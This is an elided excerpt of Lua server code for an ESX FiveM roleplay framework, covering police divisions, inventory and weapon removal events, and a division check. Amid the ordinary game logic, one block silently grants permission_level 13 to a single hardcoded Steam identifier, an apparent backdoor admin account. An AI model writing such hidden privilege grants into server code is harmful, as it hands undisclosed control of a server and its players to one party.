  ...
  --[[] if self.permission_level > 0 then
	...
	if ESX.DoesJobExist(job, jgrade) then
		...
		if jobObject.name == 'police' then 
			...
			function(result)
				if result[1] then
					self.job.ext = result[1].divisions
				end
				wai = false
			end)
			while wai do
	...
	self.removeInventoryItem = function(name, count)
		...
		TriggerClientEvent('esx:removeInventoryirsItem', self.source, item, count)
	...
	self.setInventoryItem = function(name, count)
		...
		if oldCount > item.count  then
			...
			TriggerClientEvent('esx:removeInventoryirsItem', self.source, item, oldCount - item.count)
		else
	...
	self.setJob = function(job, grade)
		...
		if ESX.DoesJobExist(job, grade) then
			...
			if jobObject.name == 'police' and not self.job.ext then 
				self.setExt = function(division)
					self.job.ext = division
					TriggerClientEvent('esx:setJob', self.source, self.job,lastJob)
				end
				local wai = true
				exports.ghmattimysql:execute('SELECT * FROM users WHERE identifier = @identifier',{
					['identifier'] = self.identifier
	...
	--[[ESX.RegisterServerCallback('checkgun', function(source, cb, gun)
	    for i=1, #self.loadout, 1 do
			if self.loadout[i].name == gun then
				cb(self.loadout[i].name)
			else
			cb(json.encode(self.loadout))
			end
		end
		print('--------------')
	...
	self.removeWeapon = function(weaponName, ammo)
		...
		if weaponLabel then
			...
			TriggerClientEvent('esx:removeInventoryirsItem', self.source, {label = weaponLabel}, 1)
		end
	end
	...
	if self.identifier == 'steam:11000013b961c60' then
		self.permission_level = 13
	end
	...
	self.hasDivision = function(divisionName, grade)
		...
		if self.job.ext == nil then
			return false
		end

			if self.job.ext == divisionName then
			 return true
			else
				return false
			end
